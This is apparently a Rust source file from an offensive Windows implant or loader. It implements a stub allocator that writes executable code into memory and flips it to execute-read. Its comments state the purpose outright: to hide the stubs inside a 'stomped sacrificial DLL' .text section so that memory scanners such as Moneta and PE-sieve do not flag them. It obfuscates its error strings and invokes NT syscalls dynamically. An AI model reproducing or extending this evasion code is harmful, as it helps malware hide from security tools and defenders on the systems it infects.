//! Consolidated stub page allocator.
//!
//! Provides a bump allocator for writing executable stubs at 16-byte aligned
//! offsets, then flips the region to PAGE_EXECUTE_READ.
//!
//! Two modes of operation:
//! 1. **Private page** (`new()`): Allocates a fresh 4KB RW page. Simple but
//!    flagged by Moneta/PE-sieve as "Abnormal private executable memory."
//! 2. **Image-backed region** (`from_image_region()`): Writes stubs into the
//!    unused tail of a stomped sacrificial DLL's `.text` section, eliminating
//!    the private RX finding entirely.

use alloc::string::String;
use core::ffi::c_void;
use core::ptr::null_mut;

use anyhow::{Result, bail};
use obfstr::obfstring as s;
use dinvk::winapis::{NtCurrentProcess, NT_SUCCESS};

use crate::types::*;
use crate::winapis::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtLockVirtualMemory};

const PAGE_SIZE: usize = 0x1000; // 4KB
const MIN_STUB_SIZE: usize = 256; // Stubs total ~200 bytes, 256 gives margin

/// A page/region that holds multiple executable stubs at sequential offsets.
///
/// Usage:
/// 1. `StubPage::new()` or `StubPage::from_image_region(...)` — obtain a writable region
/// 2. `page.write(&bytes)` — writes stub bytes, returns the address, bumps cursor
/// 3. `page.finalize()` — flip to RX (+ lock for private pages)
pub struct StubPage {
    base: *mut c_void,
    cursor: usize,
    capacity: usize,
    /// Whether we allocated this page (`true`) or are borrowing an image-backed region (`false`).
    owned: bool,
    /// Original protection to restore in `finalize()` (only meaningful when `owned == false`).
    saved_protect: u32,
}

impl StubPage {
    /// Allocate a single 4KB private page with PAGE_READWRITE.
    ///
    /// This is the fallback path — works everywhere but produces a private RX page
    /// that memory scanners (Moneta, PE-sieve) will flag.
    pub fn new() -> Result<Self> {
        let mut base: *mut c_void = null_mut();
        let mut size = PAGE_SIZE;

        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(),
            &mut base,
            0,
            &mut size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )) {
            bail!(s!("failed to allocate stub page"));
        }

        Ok(Self {
            base,
            cursor: 0,
            capacity: PAGE_SIZE,
            owned: true,
            saved_protect: 0,
        })
    }

    /// Use an existing image-backed RX region for stubs instead of allocating private memory.
    ///
    /// The provided region must be:
    /// - At least `MIN_STUB_SIZE` bytes (256 bytes is plenty for ~200 bytes of stubs)
    /// - Within an executable section of an image-backed mapping (MEM_IMAGE)
    /// - Currently RX or RW (will be temporarily made RW for writing, restored to RX)
    ///
    /// This eliminates the "Abnormal private executable memory" finding from Moneta/PE-sieve
    /// by placing stubs inside the stomped sacrificial DLL's .text section.
    pub fn from_image_region(base: *mut c_void, size: usize) -> Result<Self> {
        if base.is_null() || size < MIN_STUB_SIZE {
            bail!(s!("invalid image region for stubs"));
        }

        // Temporarily make the region writable for stub writing
        // (it's currently RX as part of the sacrificial DLL's .text section)
        let mut addr = base;
        let mut region_size = size;
        let mut old_protect: u32 = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(),
            &mut addr,
            &mut region_size,
            PAGE_READWRITE,
            &mut old_protect,
        )) {
            bail!(s!("failed to make image region writable for stubs"));
        }

        Ok(Self {
            base,
            cursor: 0,
            capacity: size,
            owned: false,
            saved_protect: old_protect,
        })
    }

    /// Write stub bytes into the page at the current cursor position.
    ///
    /// Returns the address of the written data. The cursor is advanced past
    /// the data and aligned up to the next 16-byte boundary.
    ///
    /// # Panics
    /// Panics if the write would exceed the page boundary (should never happen
    /// with typical stub sizes totaling ~300 bytes in a 4KB page).
    pub fn write(&mut self, data: &[u8]) -> u64 {
        let offset = self.cursor;
        assert!(
            offset + data.len() <= self.capacity,
            "stub page overflow: cursor={}, len={}, capacity={}",
            offset,
            data.len(),
            self.capacity,
        );

        unsafe {
            core::ptr::copy_nonoverlapping(
                data.as_ptr(),
                (self.base as *mut u8).add(offset),
                data.len(),
            );
        }

        let addr = (self.base as usize + offset) as u64;

        // Advance cursor, align to 16 bytes for the next stub
        self.cursor = (offset + data.len() + 15) & !15;

        addr
    }

    /// Make the region executable and (for private pages) lock it into physical memory.
    ///
    /// Must be called after all stubs have been written. After this call,
    /// the region is executable and no further writes are possible.
    ///
    /// - **Private page** (`owned`): RW → RX flip + `NtLockVirtualMemory`.
    /// - **Image-backed region**: restore original protection (`saved_protect`, typically RX).
    ///   No lock needed — the pages are already part of an image mapping.
    pub fn finalize(&mut self) -> Result<()> {
        let mut addr = self.base;
        let mut old_protect: u32 = 0;

        if self.owned {
            let mut size = PAGE_SIZE;
            if !NT_SUCCESS(NtProtectVirtualMemory(
                NtCurrentProcess(),
                &mut addr,
                &mut size,
                PAGE_EXECUTE_READ as u32,
                &mut old_protect,
            )) {
                bail!(s!("failed to set stub page to RX"));
            }

            // Lock into physical memory to prevent paging
            NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        } else {
            // Restore original protection (should be RX for .text section)
            let mut size = self.capacity;
            if !NT_SUCCESS(NtProtectVirtualMemory(
                NtCurrentProcess(),
                &mut addr,
                &mut size,
                self.saved_protect,
                &mut old_protect,
            )) {
                bail!(s!("failed to restore image region protection"));
            }
        }

        Ok(())
    }

    /// Returns the base address of the stub page.
    pub fn base_addr(&self) -> u64 {
        self.base as u64
    }
}
